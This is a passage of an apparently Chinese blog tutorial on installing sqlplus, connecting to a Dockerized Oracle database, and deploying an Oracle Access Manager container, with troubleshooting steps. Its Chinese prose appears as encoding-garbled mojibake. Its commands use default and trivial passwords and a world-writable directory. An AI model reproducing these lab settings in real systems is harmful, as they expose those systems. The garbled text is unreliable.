</span></span></code></pre></td></tr></table></div></div><h3 id=æµ‹è¯•æ•°æ®åº“è¿æ¥>æµ‹è¯•æ•°æ®åº“è¿æ¥<a hidden class=anchor aria-hidden=true href=#æµ‹è¯•æ•°æ®åº“è¿æ¥>#</a></h3><h4 id=å®‰è£…sqlplus>å®‰è£…sqlplus<a hidden class=anchor aria-hidden=true href=#å®‰è£…sqlplus>#</a></h4><p>å‚è€ƒhttps://askubuntu.com/questions/159939/how-to-install-sqlplus</p><h5 id=step1>step1:<a hidden class=anchor aria-hidden=true href=#step1>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo apt-get install alien</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=step2>step2:<a hidden class=anchor aria-hidden=true href=#step2>#</a></h5><p>åœ¨ <a href=https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html>https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html</a> ä¸‹è½½3ä¸ªæ–‡ä»¶
oracle-instantclient12.2-basic-12.2.0.1.0-1.x86_64.rpm
oracle-instantclient12.2-sqlplus-12.2.0.1.0-1.x86_64.rpm
oracle-instantclient12.2-devel-12.2.0.1.0-1.x86_64.rpm</p><h5 id=step3>step3:<a hidden class=anchor aria-hidden=true href=#step3>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo alien -i oracle-instantclient*-basic*.rpm</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo alien -i oracle-instantclient*-sqlplus*.rpm</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo alien -i oracle-instantclient*-devel*.rpm</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=step4>step4:<a hidden class=anchor aria-hidden=true href=#step4>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo apt-get install libaio1</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=step5>step5:<a hidden class=anchor aria-hidden=true href=#step5>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo sensible-editor /etc/ld.so.conf.d/oracle.conf</span>
</span></span><span style=display:flex><span>ç²˜è´´å³ä¾§å†…å®¹ï¼š /usr/lib/oracle/12.2/client64/lib/
</span></span></code></pre></td></tr></table></div></div><h5 id=step6>step6:<a hidden class=anchor aria-hidden=true href=#step6>#</a></h5><p>sudo ldconfig</p><h5 id=step7-æµ‹è¯•é“¾æ¥>step7 æµ‹è¯•é“¾æ¥<a hidden class=anchor aria-hidden=true href=#step7-æµ‹è¯•é“¾æ¥>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sqlplus64 sys/Oradoc_db1@//127.0.0.1:1521/ORCLCDB.localdomain as sysdba</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sqlplus64 sys/Oradoc_db1@//172.17.0.1:1521/ORCLPDB1.localdomain as sysdba</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=Image.png alt=Image></p><h5 id=å…¶ä»–sqlplus64çš„ç”¨æ³•>å…¶ä»–ï¼šsqlplus64çš„ç”¨æ³•<a hidden class=anchor aria-hidden=true href=#å…¶ä»–sqlplus64çš„ç”¨æ³•>#</a></h5><p>sqlplus64çš„ç”¨æ³•ï¼š<code>sqlplus [ [&lt;option>] [{logon | /nolog}] [&lt;start>] ]</code></p><p>å…¶ä¸­<code>&lt;logon></code> æ˜¯</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>{&lt;username&gt;[/&lt;password&gt;][@&lt;connect_identifier&gt;] | / } [AS {SYSDBA | SYSOPER | SYSASM | SYSBACKUP | SYSDG | SYSKM | SYSRAC}] [EDITION=value]
</span></span></code></pre></td></tr></table></div></div><p>å…¶ä¸­<code>&lt;connect_identifier></code>å¯ä»¥æ˜¯å¦‚ä¸‹æ ¼å¼ <code>@[&lt;net_service_name> | [//]Host[:Port]/&lt;service_name>]</code></p><p>å¦‚ä½•çŸ¥é“ service_name æˆ–è€… net_service_nameï¼Ÿ<a href=https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070>Oracleæ•°æ®åº“å®¹å™¨é•œåƒæ–‡æ¡£</a> è¯´<code>service_name</code>å®šä¹‰åœ¨ç¯å¢ƒå˜é‡TNS_ADMINå®šä¹‰çš„ç›®å½•ä¸‹çš„tnsnames.oraæ–‡ä»¶ä¸­ï¼Œ
è¿›å®¹å™¨çœ‹åˆ° <code>TNS_ADMIN=/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB </code>ï¼Œtnsnames.oraæ–‡ä»¶å†…å®¹ä¸º</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ORCLCDB =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLCDB.localdomain)     )   )
</span></span><span style=display:flex><span>ORCLPDB1 =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLPDB1.localdomain)     )   )
</span></span></code></pre></td></tr></table></div></div><p>æ‰€ä»¥ <code>SERVICE_NAME</code> å¯ä»¥æ˜¯ <code>ORCLCDB.localdomain</code> æˆ–è€… <code>ORCLPDB1.localdomain</code> ã€‚</p><h2 id=ä¸‹è½½oamé•œåƒ>â‘¡ä¸‹è½½OAMé•œåƒ<a hidden class=anchor aria-hidden=true href=#ä¸‹è½½oamé•œåƒ>#</a></h2><p>è¿›å…¥ <a href=https://container-registry.oracle.com/>https://container-registry.oracle.com/</a> ï¼Œç‚¹å‡»å³ä¸Šè§’Sign Inï¼Œç™»é™†è‡ªå·±çš„Oracleè´¦å·ï¼Œç„¶åç‚¹å‡»MiddleWareï¼Œç„¶åç‚¹å‡»OAMã€‚</p><p><img loading=lazy src=Image-1647622537456.png alt=Image></p><p><img loading=lazy src=Image-1647622548135.png alt=Image></p><p>åœ¨å³ä¾§åŒºåŸŸåŒæ„åè®®ï¼Œç„¶åæ‰å¯ä»¥ä¸‹è½½ã€‚</p><p><img loading=lazy src=Image-1647622564727.png alt=Image></p><p>å¦åˆ™å³ä½¿docker loginï¼Œè¿˜æ˜¯æ— æ³•ä¸‹è½½ï¼Œä¼šæç¤º</p><blockquote><p>Error response from daemon: pull access denied for container-registry.oracle.com/middleware/oam, repository does not exist or may require â€˜docker loginâ€™: denied: requested access to the resource is deniedã€‚</p></blockquote><p><img loading=lazy src=Image-1647622614687.png alt=Image></p><p>åŒæ„åè®®ä¹‹åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo docker login container-registry.oracle.com</span>
</span></span></code></pre></td></tr></table></div></div><p>è¾“å…¥åœ¨Oracleæ³¨å†Œçš„è´¦å·å¯†ç </p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=Image-1647622674132.png alt=Image></p><h2 id=åˆ›å»ºå®¹å™¨ä¸€oamadmin>â‘¢åˆ›å»ºå®¹å™¨ä¸€oamadmin<a hidden class=anchor aria-hidden=true href=#åˆ›å»ºå®¹å™¨ä¸€oamadmin>#</a></h2><p>å‚è€ƒæ•™ç¨‹åˆ›å»ºOAM Administration Server Containerï¼Œå…¶ä¸­åŒ…å«WebLogic å’ŒOAM Consoles.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker images
</span></span><span style=display:flex><span>sudo docker network create -d bridge OamNET
</span></span><span style=display:flex><span><span style=color:#75715e># 14f104a67b0819335f9490dadc3e4003540bcdbb7b19436b2aea56250a5f2713</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo mkdir -p /scratch/user_projects
</span></span><span style=display:flex><span>sudo chmod <span style=color:#ae81ff>777</span> /scratch/user_projects
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>password --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><p>å¯èƒ½ä¼šè¿ä¸ä¸Šï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è°ƒè¯•ï¼Œçœ‹çœ‹é”™è¯¯æ˜¯ä»€ä¹ˆ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run --rm --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>password --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><h3 id=æŠ¥é”™åŠè§£å†³>æŠ¥é”™åŠè§£å†³<a hidden class=anchor aria-hidden=true href=#æŠ¥é”™åŠè§£å†³>#</a></h3><h4 id=æŠ¥é”™ä¸€æ— æ³•è¿æ¥æ•°æ®åº“>æŠ¥é”™ä¸€ï¼šæ— æ³•è¿æ¥æ•°æ®åº“<a hidden class=anchor aria-hidden=true href=#æŠ¥é”™ä¸€æ— æ³•è¿æ¥æ•°æ®åº“>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Unable to connect to the database using the provided details.
</span></span><span style=display:flex><span>Enter a valid hostname and port or check if the listener is up and running
</span></span></code></pre></td></tr></table></div></div><h4 id=è§£å†³ä¸€ä½¿ç”¨æ­£ç¡®çš„ip>è§£å†³ä¸€ï¼šä½¿ç”¨æ­£ç¡®çš„IP<a hidden class=anchor aria-hidden=true href=#è§£å†³ä¸€ä½¿ç”¨æ­£ç¡®çš„ip>#</a></h4><p>éœ€è¦æ³¨æ„CONNECTION_STRINGæ˜¯ä»æ–°å»ºçš„å®¹å™¨ä¸­è®¿é—®çš„ï¼Œæ‰€ä»¥ç»™çš„IPåº”è¯¥æ˜¯å®¹å™¨ç½‘å¡çš„ç½‘å…³æˆ–è€…ä¸»æœºçš„ï¼Œæ¯”å¦‚ 172.17.0.1ï¼Œè€Œä¸æ˜¯127.0.0.1ã€‚</p><h4 id=æŠ¥é”™äºŒæ— æ³•è¿æ¥cdb>æŠ¥é”™äºŒï¼šæ— æ³•è¿æ¥CDB<a hidden class=anchor aria-hidden=true href=#æŠ¥é”™äºŒæ— æ³•è¿æ¥cdb>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>The selected Oracle database is a multitenant container database (CDB). Connecting to a multitenant container database (CDB) is not supported. Instead, connect to a valid pluggable database (PDB).
</span></span></code></pre></td></tr></table></div></div><h4 id=è§£å†³äºŒä½¿ç”¨pdb>è§£å†³äºŒï¼šä½¿ç”¨PDB<a hidden class=anchor aria-hidden=true href=#è§£å†³äºŒä½¿ç”¨pdb>#</a></h4><blockquote><p>PDBå’ŒCDBæ˜¯Oracle12çš„æ–°ç‰¹æ€§ï¼ŒCDBæ˜¯å¤šç§Ÿçš„ã€‚Oracle æ•°æ®åº“ 12 c å¤šç§Ÿæˆ·é€‰é¡¹å…è®¸å•ä¸ªå®¹å™¨æ•°æ®åº“ ï¼ˆCDBï¼‰ æ¥æ‰¿è½½å¤šä¸ªå•ç‹¬çš„å¯æ’æ‹”æ•°æ®åº“ (PDB)ã€‚</p><p>â€”â€”https://www.cnblogs.com/kerrycode/p/3386917.html</p></blockquote><p>ä½¿ç”¨ä»¥ä¸‹è¯­å¥æŸ¥çœ‹è‡ªå·±æ˜¯å¦æ˜¯æ‰€ç§Ÿæ•°æ®åº“</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>select name, decode(cdb, &#39;YES&#39;, &#39;Multitenant Option enabled&#39;, &#39;Regular 12c Database: &#39;) &#34;Multitenant Option&#34; , open_mode, con_id from v$database;
</span></span></code></pre></td></tr></table></div></div><p>ç»“æœ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>NAME      Multitenant Option         OPEN_MODE              CON_ID
</span></span><span style=display:flex><span>--------- -------------------------- -------------------- ----------
</span></span><span style=display:flex><span>ORCLCDB   Multitenant Option enabled READ WRITE            0
</span></span></code></pre></td></tr></table></div></div><p>æˆ–è€…ç›´æ¥</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>select cdb from v$database
</span></span></code></pre></td></tr></table></div></div><p>YESè¡¨ç¤ºè¯¥æ•°æ®åº“æ˜¯CDB,å¦‚æœæ˜¯NOè¡¨ç¤ºæ˜¯NO-CDB(æ™®é€šæ•°æ®åº“)</p><p>æˆ–è€…æ‰§è¡Œ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>show pdbs;
